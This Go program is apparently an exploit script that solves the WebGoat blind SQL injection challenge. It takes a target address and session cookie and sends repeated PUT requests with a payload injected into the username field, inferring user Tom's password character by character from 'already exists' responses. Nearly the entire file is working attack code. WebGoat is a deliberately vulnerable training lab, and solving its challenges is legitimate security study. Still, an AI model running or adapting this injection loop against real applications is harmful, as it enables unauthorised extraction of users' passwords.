//Blind SQLi Get Tom's Password

package main

import (
        "fmt"
        "io/ioutil"
        "log"
        "net/http"
        "os"
        "strconv"
        "strings"
)

type methods interface {
        getPass()
}

type Pass struct {
        ip            string
        port          string
        sessionCookie string
}

func banner(str string) string {
        return str
}

func (p Pass) getPass() {
        url := "http://" + p.ip + ":" + p.port + "/WebGoat/SqlInjectionAdvanced/challenge"
        fmt.Println("URL:>", url)

        client := &http.Client{}

        password := ""

        for i := 1; i < 25; i++ {
                letters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

                for _, letter := range letters {
                        params := "username_reg=tom' AND substring(password,1," + strconv.Itoa(i) + ")='" + password + string(letter) + "&email_reg=test%40test.test&password_reg=test&confirm_password_reg=test"
                        req, err := http.NewRequest("PUT", url, strings.NewReader(params))
                        if err != nil {
                                log.Fatal(err)
                        }

                        req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
                        req.Header.Set("Referer", "http://"+p.ip+":"+p.port+"/WebGoat/start.mvc")
                        req.Header.Set("Origin", "http://"+p.ip+":"+p.port)
                        req.Header.Set("Host", p.ip+":"+p.port)
                        req.Header.Set("Content-Length", strconv.Itoa(len(params)))
                        req.Header.Set("sec-ch-ua", "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"")
                        req.Header.Set("Accept", "*/*")
                        req.Header.Set("Connection", "keep-alive")
                        req.Header.Set("X-Requested-With", "XMLHttpRequest")
                        req.Header.Set("sec-ch-ua-mobile", "?0")
                        req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36")
                        req.Header.Set("sec-ch-ua-platform", "Linux")
                        req.Header.Set("Sec-Fetch-Site", "same-origin")
                        req.Header.Set("Sec-Fetch-Mode", "cors")
                        req.Header.Set("Sec-Fetch-Dest", "empty")
                        req.Header.Set("Accept-Language", "en-US,en;q=0.9")
                        req.Header.Set("Accept-Encoding", "gzip, deflate")

                        // Add JSESSIONID cookie
                        cookie := &http.Cookie{
                                Name:  "JSESSIONID",
                                Value: p.sessionCookie,
                        }
                        req.AddCookie(cookie)

                        resp, err := client.Do(req)
                        if err != nil {
                                log.Fatal(err)
                        }
                        defer resp.Body.Close()

                        body, err := ioutil.ReadAll(resp.Body)
                        if err != nil {
                                log.Fatal(err)
                        }

                        response := string(body)

                        if strings.Contains(response, "already exists") {
                                password += string(letter)
                                fmt.Println(password)
                                break
                        } else {
                                continue
                        }
                }
        }

        fmt.Println("Password Found: " + password)
        fmt.Println("Successfully Completed")
}

func callMethod(m methods) {
        m.getPass()
}

func main() {
        if len(os.Args) < 4 {
                fmt.Println("Usage: ./getPass <ip> <port> <sessionCookie>")
                os.Exit(1)
        }
        fmt.Println(banner(`                                                                       
 _____ _ _       _    _____ _____ __    _    _____         _     _ _   
| __  | |_|___ _| |  |   __|     |  |  |_|  |   __|_ _ ___| |___|_| |_ 
| __ -| | |   | . |  |__   |  |  |  |__| |  |   __|_'_| . | | . | |  _|
|_____|_|_|_|_|___|  |_____|__  _|_____|_|  |_____|_,_|  _|_|___|_|_|  
                              |__|                    |_|              
               |   Made with <3 by @Offensive Droid |
`))
        p := Pass{
                ip:            os.Args[1],
                port:          os.Args[2],
                sessionCookie: os.Args[3],
        }
        callMethod(p)
}
